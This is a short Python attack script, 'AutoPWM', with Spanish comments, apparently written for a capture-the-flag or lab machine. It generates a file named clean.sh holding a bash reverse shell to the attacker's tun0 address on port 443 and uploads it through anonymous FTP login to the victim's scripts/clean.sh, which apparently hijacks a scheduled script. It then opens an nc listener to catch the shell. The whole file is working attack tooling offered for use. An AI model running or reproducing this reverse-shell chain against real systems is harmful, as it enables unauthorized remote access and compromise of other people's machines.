from ftplib import FTP
import os
import netifaces


class AutoPWM:
    def __init__(self, servidor_ftp, archivo_local, archivo_remoto, direccion_ip):
        self.servidor_ftp = servidor_ftp
        self.archivo_local = archivo_local
        self.archivo_remoto = archivo_remoto
        self.direccion_ip = direccion_ip


    def obtener_ip(self):
        direcciones = netifaces.ifaddresses('tun0')
        
        if netifaces.AF_INET in direcciones:
            tun0 = direcciones[netifaces.AF_INET][0]['addr']
            print("La dirección IP de la interfaz tun0 es:", tun0)
            return tun0
        else:
            print("No se encontraron direcciones IP para la interfaz tun0")
            return None
    
    def crear_archivo(self):
        direccion_ip = self.obtener_ip()

        if direccion_ip:
            with open("clean.sh", "w") as archivo:
                archivo.write("#!/bin/bash\n\nbash -i >& /dev/tcp/" + direccion_ip + "/443 0>&1\n")

            if os.path.isfile("clean.sh"):
                print("Se ha creado correctamente el archivo clean.sh malicioso, listo para subir a la máquina víctima")
            else:
                print("Hubo un error en el proceso")
                exit(1)

    def subir_archivo_servidor_ftp(self):
        try:
            with FTP(self.servidor_ftp) as ftp:
                ftp.login()
                with open(self.archivo_local, 'rb') as archivo:
                    ftp.storbinary(f'STOR {self.archivo_remoto}', archivo)
                print('Archivo subido exitosamente al servidor FTP.')
                os.remove('clean.sh')
        except Exception as e:
            print(f'Error al subir el archivo al servidor FTP: {e}')

    def iniciar_escucha_puerto(self):
        try:
            output = os.system('nc -nlvp 443')
            print(f"Escucha en el puerto 443 iniciada correctamente.")
            print(output)
        except:
            print(f"Error al iniciar la escucha en el puerto 443")


direccion_ip = input("Introduce la IP de la máquina víctima: ")
servidor_ftp = direccion_ip
archivo_local = 'clean.sh'
archivo_remoto = 'scripts/clean.sh'

autopwm = AutoPWM(servidor_ftp, archivo_local, archivo_remoto, direccion_ip)

autopwm.crear_archivo()
autopwm.subir_archivo_servidor_ftp()
autopwm.iniciar_escucha_puerto()



